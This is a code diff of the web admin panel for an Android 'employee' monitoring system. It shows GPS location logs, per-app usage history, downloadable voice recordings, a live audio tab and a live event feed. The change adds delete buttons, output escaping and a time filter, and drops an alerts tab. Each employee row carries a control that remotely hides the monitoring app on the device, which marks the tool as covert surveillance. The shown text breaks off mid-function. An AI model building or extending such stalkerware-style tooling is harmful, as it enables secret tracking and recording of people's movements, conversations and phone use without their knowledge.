@@ -17,7 +17,6 @@
   * { margin:0; padding:0; box-sizing:border-box; }
   body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); }
 
-  /* ── Sidebar ── */
   .sidebar {
     position:fixed; left:0; top:0; width:240px; height:100vh;
     background:var(--primary); color:#fff; display:flex; flex-direction:column;
@@ -36,14 +35,7 @@
   .nav-item.active { background:rgba(255,255,255,.15); border-left-color:#fff; }
   .nav-item .icon { font-size:18px; width:24px; text-align:center; }
   .sidebar-footer { padding:16px 20px; border-top:1px solid rgba(255,255,255,.15); }
-  .logout-btn {
-    display:block; width:100%; padding:10px; background:rgba(255,255,255,.1);
-    color:#fff; border:1px solid rgba(255,255,255,.3); border-radius:8px;
-    cursor:pointer; font-size:13px; text-align:center; text-decoration:none;
-  }
-  .logout-btn:hover { background:rgba(255,255,255,.2); }
 
-  /* ── Main ── */
   .main { margin-left:240px; min-height:100vh; }
   .topbar {
     background:#fff; padding:16px 28px; display:flex;
@@ -63,13 +55,10 @@
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
 
   .content { padding:24px 28px; }
-
-  /* ── Tabs ── */
   .tab-content { display:none; }
   .tab-content.active { display:block; }
 
-  /* ── Stats cards ── */
-  .stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:24px; }
+  .stats-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; margin-bottom:24px; }
   .stat-card {
     background:var(--card); border-radius:12px; padding:20px;
     box-shadow:var(--shadow); display:flex; align-items:center; gap:16px;
@@ -78,9 +67,8 @@
   .stat-val { font-size:28px; font-weight:700; color:var(--primary); }
   .stat-lbl { font-size:13px; color:var(--muted); margin-top:2px; }
 
-  /* ── Employee table ── */
   .card { background:var(--card); border-radius:12px; box-shadow:var(--shadow); overflow:hidden; margin-bottom:24px; }
-  .card-header { padding:16px 20px; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; }
+  .card-header { padding:16px 20px; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px; }
   .card-header h3 { font-size:15px; font-weight:600; }
   table { width:100%; border-collapse:collapse; font-size:13px; }
   th { padding:10px 16px; background:#f8f9fa; text-align:left; font-weight:600; color:var(--muted); font-size:12px; text-transform:uppercase; letter-spacing:.5px; }
@@ -99,11 +87,10 @@
   .btn-primary { background:var(--primary); color:#fff; }
   .btn-primary:hover { background:#283593; }
   .btn-danger  { background:#ffebee; color:#c62828; }
+  .btn-danger:hover { background:#ffcdd2; }
   .btn-warn    { background:#fff3e0; color:#e65100; }
   .btn-success { background:#e8f5e9; color:#2e7d32; }
 
-  /* ── Detail panel ── */
-  .detail-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
   .map-placeholder {
     background:linear-gradient(135deg,#e8eaf6,#c5cae9); border-radius:8px;
     height:260px; display:flex; flex-direction:column; align-items:center; justify-content:center;
@@ -111,7 +98,6 @@
   }
   .map-placeholder .map-icon { font-size:48px; }
 
-  /* ── Voice recordings ── */
   .voice-list { max-height:400px; overflow-y:auto; }
   .voice-item {
     display:flex; align-items:center; gap:12px;
@@ -124,29 +110,14 @@
   .voice-item .vi-meta { font-size:11px; color:var(--muted); margin-top:2px; }
   audio { height:32px; }
 
-  /* ── App usage ── */
   .app-bar { display:flex; align-items:center; gap:10px; margin-bottom:6px; }
   .app-bar .app-name { font-size:13px; font-weight:500; width:160px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
   .bar-track { flex:1; height:18px; background:#f0f2f5; border-radius:99px; overflow:hidden; }
   .bar-fill  { height:100%; background:linear-gradient(90deg,#1a237e,#3949ab); border-radius:99px; transition:.5s; }
   .app-time  { font-size:11px; color:var(--muted); width:60px; text-align:right; }
 
-  /* ── Alerts ── */
-  .alert-item {
-    display:flex; align-items:flex-start; gap:12px;
-    padding:10px 16px; border-bottom:1px solid var(--border);
-  }
-  .alert-dot { width:10px; height:10px; border-radius:50%; margin-top:4px; flex-shrink:0; }
-  .alert-dot.info    { background:#1a237e; }
-  .alert-dot.warning { background:#e65100; }
-  .alert-dot.danger  { background:#c62828; }
-  .alert-msg  { font-size:13px; font-weight:500; }
-  .alert-time { font-size:11px; color:var(--muted); margin-top:2px; }
-
-  /* ── Location log ── */
   .loc-table td, .loc-table th { font-size:12px; }
 
-  /* ── Live feed ── */
   .live-events { max-height:420px; overflow-y:auto; }
   .live-event {
     display:flex; gap:10px; padding:10px 16px;
@@ -162,27 +133,26 @@
   .ev-detail { color:var(--muted); flex:1; }
   .ev-time { color:var(--muted); white-space:nowrap; }
 
-  /* ── Responsive ── */
   @media(max-width:900px) {
     .stats-grid { grid-template-columns:1fr 1fr; }
-    .detail-grid { grid-template-columns:1fr; }
   }
 
-  /* Selector */
-  select {
+  select, input[type="date"], input[type="time"] {
     padding:6px 12px; border:1px solid var(--border); border-radius:6px;
     font-size:13px; background:#fff; cursor:pointer;
   }
 
-  /* ── Live Audio ── */
-  #audioVisualizer { animation: fadeIn .3s; }
   #liveAudioArea { min-height:200px; }
-  .listen-active { animation: pulse 1.5s infinite; }
+
+  .hour-block { margin-bottom:16px; padding:12px; background:#fafafa; border-radius:8px; }
+  .hour-block h4 { font-size:14px; font-weight:600; color:var(--primary); margin-bottom:8px; }
+  .hour-app { display:flex; align-items:center; gap:8px; padding:4px 0; font-size:13px; }
+  .hour-app .dot { width:8px; height:8px; border-radius:50%; background:var(--primary); flex-shrink:0; }
+  .filter-row { display:flex; align-items:center; gap:12px; flex-wrap:wrap; }
 </style>
 </head>
 <body>
 
-<!-- Sidebar -->
 <nav class="sidebar">
   <div class="sidebar-logo">
     <h2>🛡️ Monitor</h2>
@@ -204,9 +174,6 @@
     <div class="nav-item" onclick="showTab('voice')">
       <span class="icon">🎙️</span> Voice Recordings
     </div>
-    <div class="nav-item" onclick="showTab('alerts')">
-      <span class="icon">🔔</span> Alerts
-    </div>
     <div class="nav-item" onclick="showTab('livefeed')">
       <span class="icon">⚡</span> Live Feed
     </div>
@@ -215,11 +182,10 @@
     </div>
   </div>
   <div class="sidebar-footer">
-    <span style="font-size:12px;opacity:.5">Admin Panel v1.0</span>
+    <span style="font-size:12px;opacity:.5">Admin Panel v1.1</span>
   </div>
 </nav>
 
-<!-- Main -->
 <div class="main">
   <div class="topbar">
     <h1 id="tabTitle">Dashboard</h1>
@@ -231,7 +197,7 @@
 
   <div class="content">
 
-    <!-- ══ DASHBOARD ══ -->
+    <!-- DASHBOARD -->
     <div id="tab-dashboard" class="tab-content active">
       <div class="stats-grid">
         <div class="stat-card">
@@ -246,19 +212,7 @@
           <div class="stat-icon">🎙️</div>
           <div><div class="stat-val" id="statVoice">0</div><div class="stat-lbl">Voice Recordings</div></div>
         </div>
-        <div class="stat-card">
-          <div class="stat-icon">🔔</div>
-          <div><div class="stat-val" id="statAlerts">0</div><div class="stat-lbl">Total Alerts</div></div>
-        </div>
       </div>
-
-      <!-- Recent alerts -->
-      <div class="card">
-        <div class="card-header"><h3>🔔 Recent Alerts</h3></div>
-        <div id="dashAlerts"></div>
-      </div>
-
-      <!-- Live event chart placeholder -->
       <div class="card">
         <div class="card-header"><h3>📈 Activity (Last 60 Min)</h3></div>
         <div style="padding:16px;height:220px">
@@ -267,7 +221,7 @@
       </div>
     </div>
 
-    <!-- ══ EMPLOYEES ══ -->
+    <!-- EMPLOYEES -->
     <div id="tab-employees" class="tab-content">
       <div class="card">
         <div class="card-header"><h3>👥 All Employees</h3></div>
@@ -283,14 +237,17 @@
       </div>
     </div>
 
-    <!-- ══ LOCATION ══ -->
+    <!-- LOCATION -->
     <div id="tab-location" class="tab-content">
       <div class="card" style="margin-bottom:16px">
         <div class="card-header">
           <h3>📍 Location Tracking</h3>
-          <select id="locEmpSel" onchange="loadLocation()">
-            <option value="">-- Select Employee --</option>
-          </select>
+          <div style="display:flex;gap:8px;align-items:center">
+            <select id="locEmpSel" onchange="loadLocation()">
+              <option value="">-- Select Employee --</option>
+            </select>
+            <button class="btn-sm btn-danger" onclick="deleteLocationData()">🗑️ Delete All</button>
+          </div>
         </div>
         <div style="padding:16px">
           <div class="map-placeholder" id="mapArea">
@@ -299,7 +256,6 @@
           </div>
         </div>
       </div>
-
       <div class="card">
         <div class="card-header"><h3>Location Log</h3></div>
         <div style="overflow-x:auto">
@@ -311,29 +267,50 @@
       </div>
     </div>
 
-    <!-- ══ APP USAGE ══ -->
+    <!-- APP USAGE -->
     <div id="tab-appusage" class="tab-content">
       <div class="card">
         <div class="card-header">
-          <h3>📱 App Usage</h3>
-          <select id="appEmpSel" onchange="loadAppUsage()">
-            <option value="">-- Select Employee --</option>
-          </select>
+          <h3>📱 App Usage Summary</h3>
+          <div style="display:flex;gap:8px;align-items:center">
+            <select id="appEmpSel" onchange="loadAppUsage();loadAppHistory()">
+              <option value="">-- Select Employee --</option>
+            </select>
+            <button class="btn-sm btn-danger" onclick="deleteAppUsageData()">🗑️ Delete All</button>
+          </div>
         </div>
         <div style="padding:20px" id="appUsageContent">
           <p style="color:var(--muted);text-align:center">Select an employee to view app usage</p>
         </div>
       </div>
+      <div class="card">
+        <div class="card-header">
+          <h3>📅 Time-Based History</h3>
+          <div class="filter-row">
+            <input type="date" id="historyDate" onchange="loadAppHistory()">
+            <input type="time" id="historyFrom" value="00:00" onchange="loadAppHistory()">
+            <span>to</span>
+            <input type="time" id="historyTo" value="23:59" onchange="loadAppHistory()">
+            <button class="btn-sm btn-primary" onclick="loadAppHistory()">🔍 Filter</button>
+          </div>
+        </div>
+        <div style="padding:20px" id="appHistoryContent">
+          <p style="color:var(--muted);text-align:center">Select an employee and date range to view hourly history</p>
+        </div>
+      </div>
     </div>
 
-    <!-- ══ VOICE ══ -->
+    <!-- VOICE -->
     <div id="tab-voice" class="tab-content">
       <div class="card">
         <div class="card-header">
           <h3>🎙️ Voice Recordings</h3>
-          <select id="voiceEmpSel" onchange="loadVoice()">
-            <option value="">-- Select Employee --</option>
-          </select>
+          <div style="display:flex;gap:8px;align-items:center">
+            <select id="voiceEmpSel" onchange="loadVoice()">
+              <option value="">-- Select Employee --</option>
+            </select>
+            <button class="btn-sm btn-danger" onclick="deleteAllVoice()">🗑️ Delete All</button>
+          </div>
         </div>
         <div class="voice-list" id="voiceList">
           <p style="padding:20px;color:var(--muted);text-align:center">Select an employee to view recordings</p>
@@ -341,15 +318,7 @@
       </div>
     </div>
 
-    <!-- ══ ALERTS ══ -->
-    <div id="tab-alerts" class="tab-content">
-      <div class="card">
-        <div class="card-header"><h3>🔔 All Alerts</h3></div>
-        <div id="alertsList" style="max-height:600px;overflow-y:auto"></div>
-      </div>
-    </div>
-
-    <!-- ══ LIVE FEED ══ -->
+    <!-- LIVE FEED -->
     <div id="tab-livefeed" class="tab-content">
       <div class="card">
         <div class="card-header">
@@ -360,7 +329,7 @@
       </div>
     </div>
 
-    <!-- ══ LIVE AUDIO ══ -->
+    <!-- LIVE AUDIO -->
     <div id="tab-liveaudio" class="tab-content">
       <div class="card">
         <div class="card-header">
@@ -393,8 +362,8 @@
       </div>
     </div>
 
-  </div><!-- /content -->
-</div><!-- /main -->
+  </div>
+</div>
 
 <script>
 const socket = io({ transports: ['polling', 'websocket'], upgrade: true });
@@ -403,78 +372,81 @@ let activityData   = Array(12).fill(0);
 let activityChart;
 let socketConnected = false;
 
-socket.on('connect', () => { socketConnected = true; console.log('Socket connected'); });
+socket.on('connect', () => { socketConnected = true; console.log('Socket connected:', socket.id); });
 socket.on('disconnect', () => { socketConnected = false; console.log('Socket disconnected'); });
 
-// ── Tab switching ──────────────────────────────────────────────
+function esc(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+// ── Tab switching ──
 function showTab(name) {
   document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
   document.getElementById('tab-' + name).classList.add('active');
   document.querySelectorAll('.nav-item').forEach(n => {
-    if (n.textContent.toLowerCase().includes(name.replace('livefeed','live'))) n.classList.add('active');
+    if (n.textContent.toLowerCase().includes(name.replace('livefeed','live feed').replace('liveaudio','live audio'))) n.classList.add('active');
   });
   const titles = { dashboard:'Dashboard', employees:'All Employees', location:'Location Tracking',
-    appusage:'App Usage', voice:'Voice Recordings', alerts:'Alerts', livefeed:'Live Feed', liveaudio:'Live Audio' };
+    appusage:'App Usage', voice:'Voice Recordings', livefeed:'Live Feed', liveaudio:'Live Audio' };
   document.getElementById('tabTitle').textContent = titles[name] || name;
 }
 
-// ── Stats ──────────────────────────────────────────────────────
+// ── Stats ──
 async function refreshStats() {
-  const r = await fetch('/api/stats');
-  const d = await r.json();
-  document.getElementById('statTotal').textContent  = d.totalEmployees;
-  document.getElementById('statOnline').textContent = d.onlineNow;
-  document.getElementById('statVoice').textContent  = d.totalVoiceFiles;
-  document.getElementById('statAlerts').textContent = d.totalAlerts;
+  try {
+    const r = await fetch('/api/stats');
+    const d = await r.json();
+    document.getElementById('statTotal').textContent  = d.totalEmployees;
+    document.getElementById('statOnline').textContent = d.onlineNow;
+    document.getElementById('statVoice').textContent  = d.totalVoiceFiles;
+  } catch(e) { console.error('Stats error:', e); }
 }
 
 socket.on('stats_update', d => {
   document.getElementById('statTotal').textContent  = d.totalEmployees;
   document.getElementById('statOnline').textContent = d.onlineNow;
   document.getElementById('statVoice').textContent  = d.totalVoiceFiles;
-  document.getElementById('statAlerts').textContent = d.totalAlerts;
 });
 
-// ── Employees ──────────────────────────────────────────────────
+// ── Employees ──
 async function refreshEmployees() {
-  const r = await fetch('/api/employees');
-  const emps = await r.json();
+  try {
+    const r = await fetch('/api/employees');
+    const emps = await r.json();
 
-  // Populate table
-  const tbody = document.getElementById('empTableBody');
-  tbody.innerHTML = emps.map(e => `
-    <tr>
-      <td><strong>${e.employeeName}</strong><br><small style="color:var(--muted)">${e.employeeId}</small></td>
-      <td>${e.device || '-'}<br><small style="color:var(--muted)">Android ${e.androidVersion||''}</small></td>
-      <td><span class="badge badge-${e.online?'online':'offline'}">${e.online?'🟢 Online':'⚫ Offline'}</span></td>
-      <td>${e.lastSeen ? new Date(e.lastSeen).toLocaleString() : '-'}</td>
-      <td>📍 ${e.locationCount}</td>
-      <td>🎙️ ${e.voiceCount}</td>
-      <td>
-        ${e.appHidden
-          ? `<button class="btn-sm btn-success" onclick="toggleAppVisibility('${e.employeeId}', false)">👁️ Unhide App</button>`
-          : `<button class="btn-sm btn-warn" onclick="toggleAppVisibility('${e.employeeId}', true)">🚫 Hide App</button>`
-        }
-        <span style="font-size:11px;color:var(--muted);display:block;margin-top:3px">${e.appHidden ? '🔒 Hidden' : '👁️ Visible'}</span>
-      </td>
-      <td>
-        <button class="btn-sm btn-primary" onclick="viewEmployee('${e.employeeId}','${e.employeeName}')">View</button>
-      </td>
-    </tr>
-  `).join('');
+    const tbody = document.getElementById('empTableBody');
+    tbody.innerHTML = emps.map(e => `
+      <tr>
+        <td><strong>${esc(e.employeeName)}</strong><br><small style="color:var(--muted)">${esc(e.employeeId)}</small></td>
+        <td>${esc(e.device || '-')}<br><small style="color:var(--muted)">Android ${esc(e.androidVersion||'')}</small></td>
+        <td><span class="badge badge-${e.online?'online':'offline'}">${e.online?'🟢 Online':'⚫ Offline'}</span></td>
+        <td>${e.lastSeen ? new Date(e.lastSeen).toLocaleString() : '-'}</td>
+        <td>📍 ${e.locationCount}</td>
+        <td>🎙️ ${e.voiceCount}</td>
+        <td>
+          ${e.appHidden
+            ? `<button class="btn-sm btn-success" onclick="toggleAppVisibility('${esc(e.employeeId)}', false)">👁️ Unhide</button>`
+            : `<button class="btn-sm btn-warn" onclick="toggleAppVisibility('${esc(e.employeeId)}', true)">🚫 Hide</button>`
+          }
+          <span style="font-size:11px;color:var(--muted);display:block;margin-top:3px">${e.appHidden ? '🔒 Hidden' : '👁️ Visible'}</span>
+        </td>
+        <td>
+          <button class="btn-sm btn-primary" onclick="viewEmployee('${esc(e.employeeId)}')">View</button>
+          <button class="btn-sm btn-danger" style="margin-left:4px" onclick="deleteEmployee('${esc(e.employeeId)}','${esc(e.employeeName)}')">🗑️</button>
+        </td>
+      </tr>
+    `).join('');
 
-  // Populate selectors
-  const selectors = ['locEmpSel','appEmpSel','voiceEmpSel','liveAudioEmpSel'];
-  selectors.forEach(sid => {
-    const sel = document.getElementById(sid);
-    const cur = sel.value;
-    sel.innerHTML = '<option value="">-- Select Employee --</option>' +
-      emps.map(e => `<option value="${e.employeeId}" ${e.employeeId===cur?'selected':''}>${e.employeeName} (${e.employeeId})</option>`).join('');
-  });
+    const selectors = ['locEmpSel','appEmpSel','voiceEmpSel','liveAudioEmpSel'];
+    selectors.forEach(sid => {
+      const sel = document.getElementById(sid);
+      const cur = sel.value;
+      sel.innerHTML = '<option value="">-- Select Employee --</option>' +
+        emps.map(e => `<option value="${esc(e.employeeId)}" ${e.employeeId===cur?'selected':''}>${esc(e.employeeName)} (${esc(e.employeeId)})</option>`).join('');
+    });
+  } catch(e) { console.error('Employees error:', e); }
 }
 
-function viewEmployee(id, name) {
+function viewEmployee(id) {
   document.getElementById('locEmpSel').value = id;
   document.getElementById('appEmpSel').value = id;
   document.getElementById('voiceEmpSel').value = id;
@@ -484,68 +456,75 @@ function viewEmployee(id, name) {
 
 socket.on('employee_status_change', () => refreshEmployees());
 
-// ── Hide/Unhide App ────────────────────────────────────────────
+async function deleteEmployee(empId, empName) {
+  if (!confirm('Delete "' + empName + '" and ALL their data (location, voice, app usage)?')) return;
+  await fetch('/api/employees/' + encodeURIComponent(empId), { method: 'DELETE' });
+  refreshEmployees();
+  refreshStats();
+}
+
 function toggleAppVisibility(employeeId, hide) {
-  if (confirm(`Are you sure you want to ${hide ? 'HIDE' : 'UNHIDE'} the app on device ${employeeId}?`)) {
+  if (confirm('Are you sure you want to ' + (hide ? 'HIDE' : 'UNHIDE') + ' the app on device ' + employeeId + '?')) {
     socket.emit('admin_hide_app', { employeeId, hide });
   }
 }
 
 socket.on('app_hidden_changed', () => refreshEmployees());
 
-// ── Location ───────────────────────────────────────────────────
+// ── Location ──
 async function loadLocation() {
   const empId = document.getElementById('locEmpSel').value;
   if (!empId) return;
 
-  const r    = await fetch('/api/location/' + empId);
+  const r    = await fetch('/api/location/' + encodeURIComponent(empId));
   const locs = await r.json();
 
-  // Map visual with coordinates
   const mapArea = document.getElementById('mapArea');
   if (locs.length > 0) {
     const last = locs[locs.length - 1];
-    mapArea.innerHTML = `
-      <div style="text-align:center">
-        <div style="font-size:48px">📍</div>
-        <div style="font-size:16px;font-weight:700;color:var(--primary);margin:8px 0">Last Known Location</div>
-        <div style="font-size:22px;font-weight:700">${last.latitude.toFixed(6)}, ${last.longitude.toFixed(6)}</div>
-        <div style="font-size:13px;color:var(--muted);margin-top:6px">Accuracy: ${last.accuracy?.toFixed(0)||'?'}m | Speed: ${last.speed?.toFixed(1)||'0'} m/s</div>
-        <div style="font-size:12px;color:var(--muted)">${new Date(last.timestamp).toLocaleString()}</div>
-        <a href="https://maps.google.com/?q=${last.latitude},${last.longitude}" target="_blank"
-           style="display:inline-block;margin-top:12px;padding:8px 18px;background:var(--primary);color:#fff;border-radius:6px;text-decoration:none;font-size:13px">
-          Open in Google Maps 🗺️
-        </a>
-      </div>`;
+    mapArea.innerHTML = '<div style="text-align:center">' +
+      '<div style="font-size:48px">📍</div>' +
+      '<div style="font-size:16px;font-weight:700;color:var(--primary);margin:8px 0">Last Known Location</div>' +
+      '<div style="font-size:22px;font-weight:700">' + last.latitude.toFixed(6) + ', ' + last.longitude.toFixed(6) + '</div>' +
+      '<div style="font-size:13px;color:var(--muted);margin-top:6px">Accuracy: ' + (last.accuracy ? last.accuracy.toFixed(0) : '?') + 'm | Speed: ' + (last.speed ? last.speed.toFixed(1) : '0') + ' m/s</div>' +
+      '<div style="font-size:12px;color:var(--muted)">' + new Date(last.timestamp).toLocaleString() + '</div>' +
+      '<a href="https://maps.google.com/?q=' + last.latitude + ',' + last.longitude + '" target="_blank" ' +
+      'style="display:inline-block;margin-top:12px;padding:8px 18px;background:var(--primary);color:#fff;border-radius:6px;text-decoration:none;font-size:13px">' +
+      'Open in Google Maps 🗺️</a></div>';
   } else {
     mapArea.innerHTML = '<div class="map-icon">🗺️</div><div>No location data yet</div>';
   }
 
-  // Table
   const tbody = document.getElementById('locTableBody');
-  tbody.innerHTML = [...locs].reverse().slice(0,100).map(l => `
-    <tr>
-      <td>${new Date(l.timestamp).toLocaleString()}</td>
-      <td>${l.latitude?.toFixed(6)}</td>
-      <td>${l.longitude?.toFixed(6)}</td>
-      <td>${l.accuracy?.toFixed(0)||'?'}m</td>
-      <td>${l.speed?.toFixed(1)||'0'} m/s</td>
-    </tr>
-  `).join('');
+  tbody.innerHTML = [...locs].reverse().slice(0,100).map(l =>
+    '<tr><td>' + new Date(l.timestamp).toLocaleString() + '</td>' +
+    '<td>' + (l.latitude ? l.latitude.toFixed(6) : '') + '</td>' +
+    '<td>' + (l.longitude ? l.longitude.toFixed(6) : '') + '</td>' +
+    '<td>' + (l.accuracy ? l.accuracy.toFixed(0) : '?') + 'm</td>' +
+    '<td>' + (l.speed ? l.speed.toFixed(1) : '0') + ' m/s</td></tr>'
+  ).join('');
+}
+
+async function deleteLocationData() {
+  const empId = document.getElementById('locEmpSel').value;
+  if (!empId) { alert('Select an employee first'); return; }
+  if (!confirm('Delete all location data for this employee?')) return;
+  await fetch('/api/location/' + encodeURIComponent(empId), { method: 'DELETE' });
+  loadLocation();
 }
 
 socket.on('live_location', data => {
   const sel = document.getElementById('locEmpSel').value;
   if (sel === data.employeeId) loadLocation();
-  addLiveEvent('loc', data.employeeName, `📍 ${data.latitude?.toFixed(4)}, ${data.longitude?.toFixed(4)}`);
+  addLiveEvent('loc', data.employeeName, '📍 ' + (data.latitude ? data.latitude.toFixed(4) : '') + ', ' + (data.longitude ? data.longitude.toFixed(4) : ''));
 });
 
-// ── App Usage ──────────────────────────────────────────────────
+// ── App Usage ──
 async function loadAppUsage() {
   const empId = document.getElementById('appEmpSel').value;
   if (!empId) return;
 
-  const r    = await fetch('/api/appusage/' + empId);
+  const r    = await fetch('/api/appusage/' + encodeURIComponent(empId));
   const apps = await r.json();
   const el   = document.getElementById('appUsageContent');
 
@@ -555,113 +534,144 @@ async function loadAppUsage() {
   el.innerHTML = apps.map(a => {
     const pct = maxMs > 0 ? (a.totalMs / maxMs * 100) : 0;
     const mins = Math.round(a.totalMs / 60000);
-    const hrs  = mins >= 60 ? ` (${(mins/60).toFixed(1)}h)` : '';
-    return `<div class="app-bar">
-      <span class="app-name" title="${a.packageName}">${a.appName}</span>
-      <div class="bar-track"><div class="bar-fill" style="width:${pct}%"></div></div>
-      <span class="app-time">${mins}m${hrs}</span>
-    </div>`;
+    const hrs  = mins >= 60 ? ' (' + (mins/60).toFixed(1) + 'h)' : '';
+    return '<div class="app-bar">' +
+      '<span class="app-name" title="' + esc(a.packageName) + '">' + esc(a.appName) + '</span>' +
+      '<div class="bar-track"><div class="bar-fill" style="width:' + pct + '%"></div></div>' +
+      '<span class="app-time">' + mins + 'm' + hrs + '</span></div>';
   }).join('');
+}
+
+async function loadAppHistory() {
+  const empId = document.getElementById('appEmpSel').value;
+  const el = document.getElementById('appHistoryContent');
+  if (!empId) { el.innerHTML = '<p style="color:var(--muted);text-align:center">Select an employee first</p>'; return; }
+
+  const dateStr = document.getElementById('historyDate').value;
+  const fromTime = document.getElementById('historyFrom').value || '00:00';
+  const toTime = document.getElementById('historyTo').value || '23:59';
+
+  let from, to;
+  if (dateStr) {
+    from = new Date(dateStr + 'T' + fromTime + ':00').getTime();
+    to = new Date(dateStr + 'T' + toTime + ':59').getTime();
+  } else {
+    const today = new Date();
+    today.setHours(0,0,0,0);
+    from = today.getTime();
+    to = Date.now();
+  }
+
+  try {
+    const r = await fetch('/api/appusage/' + encodeURIComponent(empId) + '/history?from=' + from + '&to=' + to);
+    const data = await r.json();
+
+    if (!data.length) {
+      el.innerHTML = '<p style="color:var(--muted);text-align:center">No data for this time range</p>';
+      return;
+    }
+
+    el.innerHTML = data.map(h => {
+      const appList = h.apps.map(a => {
+        const mins = Math.round(a.totalMs / 60000);
+        const hrs = mins >= 60 ? ' (' + (mins/60).toFixed(1) + 'h)' : '';
+        return '<div class="hour-app"><span class="dot"></span><strong>' + esc(a.appName) + '</strong> — ' + mins + 'm' + hrs + '</div>';
+      }).join('');
+      return '<div class="hour-block"><h4>🕐 ' + esc(h.hour) + '</h4>' + appList + '</div>';
+    }).join('');
+  } catch(e) {
+    el.innerHTML = '<p style="color:var(--muted);text-align:center">Error loading history</p>';
+    console.error('History error:', e);
+  }
+}
+
+async function deleteAppUsageData() {
+  const empId = document.getElementById('appEmpSel').value;
+  if (!empId) { alert('Select an employee first'); return; }
+  if (!confirm('Delete all app usage data for this employee?')) return;
+  await fetch('/api/appusage/' + encodeURIComponent(empId), { method: 'DELETE' });
+  loadAppUsage();
+  document.getElementById('appHistoryContent').innerHTML = '<p style="color:var(--muted);text-align:center">Data deleted</p>';
 }
 
 socket.on('live_app_usage', data => {
   const sel = document.getElementById('appEmpSel').value;
   if (sel === data.employeeId) loadAppUsage();
-  addLiveEvent('app', data.employeeName, `📱 ${data.appName} (${Math.round(data.usageMs/60000)}m)`);
+  addLiveEvent('app', data.employeeName, '📱 ' + data.appName + ' (' + Math.round(data.usageMs/60000) + 'm)');
 });
 
-// ── Voice ──────────────────────────────────────────────────────
+// ── Voice ──
 async function loadVoice() {
   const empId = document.getElementById('voiceEmpSel').value;
   if (!empId) return;
 
-  const r    = await fetch('/api/voice/' + empId);
+  const r    = await fetch('/api/voice/' + encodeURIComponent(empId));
   const recs = await r.json();
   const el   = document.getElementById('voiceList');
 
   if (!recs.length) { el.innerHTML = '<p style="padding:20px;color:var(--muted);text-align:center">No recordings yet</p>'; return; }
 
-  el.innerHTML = recs.map(v => `
-    <div class="voice-item">
-      <span style="font-size:24px">🎙️</span>
-      <div class="vi-info">
-        <div class="vi-name">${v.filename}</div>
-        <div class="vi-meta">${new Date(v.timestamp).toLocaleString()} · ${Math.round(v.durationMs/1000)}s segment</div>
-      </div>
-      <audio controls src="${v.url}"></audio>
-      <a href="${v.url}" download="${v.filename}"
-         style="padding:6px 12px;background:var(--primary-light);color:var(--primary);border-radius:6px;font-size:12px;text-decoration:none;font-weight:600">
-        ⬇ DL
-      </a>
-    </div>
-  `).join('');
+  el.innerHTML = recs.map(v =>
+    '<div class="voice-item">' +
+    '<span style="font-size:24px">🎙️</span>' +
+    '<div class="vi-info">' +
+    '<div class="vi-name">' + esc(v.filename) + '</div>' +
+    '<div class="vi-meta">' + new Date(v.timestamp).toLocaleString() + ' · ' + Math.round(v.durationMs/1000) + 's segment</div>' +
+    '</div>' +
+    '<audio controls src="' + v.url + '"></audio>' +
+    '<a href="' + v.url + '" download="' + esc(v.filename) + '" ' +
+    'style="padding:6px 12px;background:var(--primary-light);color:var(--primary);border-radius:6px;font-size:12px;text-decoration:none;font-weight:600">⬇ DL</a> ' +
+    '<button class="btn-sm btn-danger" onclick="deleteVoice(\'' + esc(v.employeeId) + '\',\'' + esc(v.filename) + '\')">🗑️</button>' +
+    '</div>'
+  ).join('');
+}
+
+async function deleteVoice(empId, filename) {
+  if (!confirm('Delete this recording?')) return;
+  await fetch('/api/voice/' + encodeURIComponent(empId) + '/' + encodeURIComponent(filename), { method: 'DELETE' });
+  loadVoice();
+  refreshStats();
+}
+
+async function deleteAllVoice() {
+  const empId = document.getElementById('voiceEmpSel').value;
+  if (!empId) { alert('Select an employee first'); return; }
+  if (!confirm('Delete ALL voice recordings for this employee?')) return;
+  await fetch('/api/voice/' + encodeURIComponent(empId), { method: 'DELETE' });
+  loadVoice();
+  refreshStats();
 }
 
 socket.on('new_voice_recording', data => {
   const sel = document.getElementById('voiceEmpSel').value;
   if (sel === data.employeeId) loadVoice();
-  addLiveEvent('voice', data.employeeName, `🎙️ New recording: ${data.filename}`);
+  addLiveEvent('voice', data.employeeName, '🎙️ New recording: ' + data.filename);
   document.getElementById('statVoice').textContent =
     parseInt(document.getElementById('statVoice').textContent) + 1;
 });
 
-// ── Alerts ─────────────────────────────────────────────────────
-async function loadAlerts() {
-  const r = await fetch('/api/alerts');
-  const alerts = await r.json();
-  renderAlerts(alerts, 'alertsList');
-  renderAlerts(alerts.slice(0,5), 'dashAlerts');
-}
-
-function renderAlerts(alerts, containerId) {
-  const el = document.getElementById(containerId);
-  if (!el) return;
-  if (!alerts.length) { el.innerHTML = '<p style="padding:16px;color:var(--muted)">No alerts yet</p>'; return; }
-  el.innerHTML = alerts.map(a => `
-    <div class="alert-item">
-      <div class="alert-dot ${a.type}"></div>
-      <div>
-        <div class="alert-msg">${a.message}</div>
-        <div class="alert-time">${new Date(a.timestamp).toLocaleString()}</div>
-      </div>
-    </div>
-  `).join('');
-}
-
-socket.on('new_alert', a => {
-  loadAlerts();
-  // bump counter
-  document.getElementById('statAlerts').textContent =
-    parseInt(document.getElementById('statAlerts').textContent) + 1;
-});
-
-// ── Live Feed ──────────────────────────────────────────────────
+// ── Live Feed ──
 function addLiveEvent(type, employee, detail) {
   const feed = document.getElementById('liveFeed');
   const div  = document.createElement('div');
   div.className = 'live-event';
   const labels = { loc:'LOCATION', app:'APP USE', voice:'VOICE' };
-  div.innerHTML = `
-    <span class="ev-type ${type}">${labels[type]}</span>
-    <span class="ev-emp">${employee}</span>
-    <span class="ev-detail">${detail}</span>
-    <span class="ev-time">${new Date().toLocaleTimeString()}</span>
-  `;
+  div.innerHTML = '<span class="ev-type ' + type + '">' + labels[type] + '</span>' +
+    '<span class="ev-emp">' + esc(employee) + '</span>' +
